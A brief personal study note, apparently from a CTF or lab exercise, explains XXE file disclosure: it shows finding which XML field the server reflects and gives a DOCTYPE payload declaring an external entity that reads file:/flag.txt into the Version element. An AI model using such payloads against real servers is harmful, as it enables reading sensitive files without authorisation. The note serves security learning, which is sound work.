
# File disclosure
when encountering a possible xxe, we look first at which element is beeing displayed to us by the server response:
![[Pasted image 20250219191057.png]]

here we see that the version field is displayed, so thats where we put our attack

we can simply define the input field after the !DOCTYPE and the !ENTITY could be anything. In our attack field we then simply enter the entity name in between &"entity"; 

it would look something like this:

<!DOCTYPE Version [
  <!ENTITY company SYSTEM "file:/flag.txt">
]>

<FirmwareUpdateConfig>
    <Firmware>
        <Version>
&company;
</Version>




